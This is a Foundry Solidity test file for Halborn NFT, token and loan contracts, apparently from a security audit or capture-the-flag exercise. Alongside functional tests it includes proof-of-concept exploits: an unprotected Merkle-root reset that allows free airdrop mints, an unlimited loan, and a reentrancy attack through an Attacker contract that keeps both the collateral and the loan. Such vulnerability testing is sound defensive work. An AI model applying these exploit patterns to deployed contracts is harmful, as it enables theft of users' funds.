// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Merkle} from "./murky/Merkle.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";

import {Attacker} from "../src/Attacker.sol";

contract HalbornTest is Test {
    address public immutable ALICE = makeAddr("ALICE");
    address public immutable BOB = makeAddr("BOB");

    bytes32[] public ALICE_PROOF_1;
    bytes32[] public ALICE_PROOF_2;
    bytes32[] public BOB_PROOF_1;
    bytes32[] public BOB_PROOF_2;

    HalbornNFT public nft;
    HalbornToken public token;
    HalbornLoans public loans;
    Attacker public attacker;

    function setUp() public {
        // Initialize
        Merkle m = new Merkle();
        // Test Data
        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
        data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));

        // Get Merkle Root
        bytes32 root = m.getRoot(data);

        // Get Proofs
        ALICE_PROOF_1 = m.getProof(data, 0);
        ALICE_PROOF_2 = m.getProof(data, 1);
        BOB_PROOF_1 = m.getProof(data, 2);
        BOB_PROOF_2 = m.getProof(data, 3);

        assertTrue(m.verifyProof(root, ALICE_PROOF_1, data[0]));
        assertTrue(m.verifyProof(root, ALICE_PROOF_2, data[1]));
        assertTrue(m.verifyProof(root, BOB_PROOF_1, data[2]));
        assertTrue(m.verifyProof(root, BOB_PROOF_2, data[3]));

        nft = new HalbornNFT();
        nft.initialize(root, 1 ether);

        token = new HalbornToken();
        token.initialize();

        loans = new HalbornLoans();
        loans.initialize(address(token), address(nft), 2 ether);

        token.setLoans(address(loans));
    }

    function test_EligibleUserCanMintNFT() public {
        //Alice is eligible to mint the NFT with ID = 15
        vm.startPrank(ALICE);
        nft.mintAirdrops(15, ALICE_PROOF_1);
        vm.stopPrank();

        assertEq(nft.ownerOf(15), ALICE);
    }

    function test_UserCanBuySeveralNFTs() public {
        //Alice mints her airdrop NFT (ID = 15)
        vm.prank(ALICE);
        nft.mintAirdrops(15, ALICE_PROOF_1);

        vm.deal(BOB, 100 ether);

        //Bob wants to buy 20 NFTs
        vm.startPrank(BOB);
        for (uint i; i < 20; ++i) {
            nft.mintBuyWithETH{value: 1 ether}();
        }
        vm.stopPrank();

        assertEq(nft.balanceOf(BOB), 20);
    }

    function test_AnyoneCanMintAirdropNFTs() public {
        Merkle m = new Merkle();
        // Alice wants to mint "free" airdrop NFTs => she simply provides an ID that has not been minted yet
        // and a second node (with arbitrary data) in order to create a merkle root and thr required merkle proof data
        bytes32[] memory data = new bytes32[](2);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(1)));
        data[1] = keccak256(abi.encodePacked(BOB, uint256(2)));

        bytes32 root = m.getRoot(data);
        bytes32[] memory proof = m.getProof(data, 0);

        //Alice simply calls the setMerkleRoot function with the merkle root she just created
        //and then she calls the mintAirdrops function with the correct NFT ID and the merkle proof
        vm.startPrank(ALICE);
        nft.setMerkleRoot(root);
        nft.mintAirdrops(1, proof);
        vm.stopPrank();

        assertEq(nft.ownerOf(1), ALICE);
    }

    function test_AnyoneCanGetAnUnlimitedLoan() private {
        uint256 freeLoan = type(uint256).max;

        vm.prank(ALICE);
        loans.getLoan(freeLoan);

        assertEq(token.balanceOf(ALICE), freeLoan);
    }

    function test_UserCanWithdrawCollateral() public {
        vm.deal(ALICE, 1 ether);

        vm.startPrank(ALICE);
        nft.mintBuyWithETH{value: 1 ether}();
        nft.approve(address(loans), 10001);

        //Alice deposits the NFT 10001 as collateral => totalCollateral == 2 ether
        loans.depositNFTCollateral(10001);
        assertEq(loans.totalCollateral(ALICE), 2 ether);

        //Alice takes a loan of 2 ether => usedCollateral == 2 ether
        loans.getLoan(2 ether);
        assertEq(loans.usedCollateral(ALICE), 2 ether);
        assertEq(token.balanceOf(ALICE), 2 ether);

        //Alice returns the entire loan => usedCollateral SHOULD BE 0 ether !!!
        loans.returnLoan(2 ether);
        assertEq(loans.usedCollateral(ALICE), 0);

        //As the loan has been paid back, Alice should be able to withdraw the collateral
        loans.withdrawCollateral(10001);

        vm.stopPrank();
    }

    function test_UserCanGetTheMaximumLoan() public {
        vm.deal(ALICE, 1 ether);

        vm.startPrank(ALICE);
        nft.mintBuyWithETH{value: 1 ether}();
        nft.approve(address(loans), 10001);

        //Alice deposits the NFT 10001 as collateral => totalCollateral == 2 ether
        loans.depositNFTCollateral(10001);
        assertEq(loans.totalCollateral(ALICE), 2 ether);

        //Alice takes a loan of 1 ether => usedCollateral == 1 ether
        loans.getLoan(1 ether);
        assertEq(loans.usedCollateral(ALICE), 1 ether);
        assertEq(token.balanceOf(ALICE), 1 ether);

        //Alice returns the entire loan => usedCollateral SHOULD BE 0 ether !!!
        loans.returnLoan(1 ether);
        assertEq(loans.usedCollateral(ALICE), 0);

        //Alice should now be able to get  aloan of 2 etherl
        loans.getLoan(2 ether);
        assertEq(loans.usedCollateral(ALICE), 2 ether);

        vm.stopPrank();
    }

    function test_UserCanWithdrawCollateralAndGetLoan() private {
        attacker = new Attacker(address(loans));

        vm.deal(address(attacker), 1 ether);

        vm.startPrank(address(attacker));
        nft.mintBuyWithETH{value: 1 ether}();
        nft.approve(address(loans), 10001);

        loans.depositNFTCollateral(10001);
        assertEq(loans.totalCollateral(address(attacker)), 2 ether);

        //the loan contract is now the owner of our NFT
        assertEq(nft.ownerOf(10001), address(loans));
        assertEq(token.balanceOf(address(attacker)), 0);

        //withdraw NFT => reenter into loan contract and call getLoan
        loans.withdrawCollateral(10001);

        //now, the attacker is the owner of the NFT AND the loan
        assertEq(nft.ownerOf(10001), address(attacker));
        assertEq(token.balanceOf(address(attacker)), 2 ether);

        vm.stopPrank();
    }

    function test_Multicall() public {
        address loansAddress = address(loans);

        vm.deal(ALICE, 1 ether);

        bytes memory data1 = abi.encodeWithSelector(
            loans.depositNFTCollateral.selector,
            10001
        );

        bytes memory data2 = abi.encodeWithSelector(
            loans.getLoan.selector,
            2 ether
        );

        bytes[] memory data = new bytes[](2);
        data[0] = data1;
        data[1] = data2;

        vm.startPrank(ALICE);
        nft.mintBuyWithETH{value: 1 ether}();
        nft.approve(address(loans), 10001);

        assertEq(loans.totalCollateral(ALICE), 0);
        assertEq(token.balanceOf(ALICE), 0);

        loans.multicall(data);

        assertEq(loans.totalCollateral(ALICE), 2 ether);
        assertEq(loans.usedCollateral(ALICE), 2 ether);
        assertEq(token.balanceOf(ALICE), 2 ether);

        vm.stopPrank();
    }

    function test_MulticallPayable() public {
        address nftAddress = address(nft);

        vm.deal(ALICE, 1 ether);

        bytes memory data1 = abi.encodeWithSelector(
            nft.mintBuyWithETH.selector
        );

        bytes memory data2 = abi.encodeWithSelector(
            nft.approve.selector,
            address(loans),
            10001
        );

        bytes[] memory data = new bytes[](2);
        data[0] = data1;
        data[1] = data2;

        vm.startPrank(ALICE);
        // nft.mintBuyWithETH{value: 1 ether}();
        // nft.approve(address(loans), 10001);

        nft.multicall{value: 1 ether}(data);

        console.log(ALICE);
        console.log(nft.ownerOf(10001));
        console.log(nft.getApproved(10001));

        // assertEq(nft.ownerOf(10001), ALICE);
        // assertEq(nft.getApproved(10001), nftAddress);

        vm.stopPrank();
    }
}
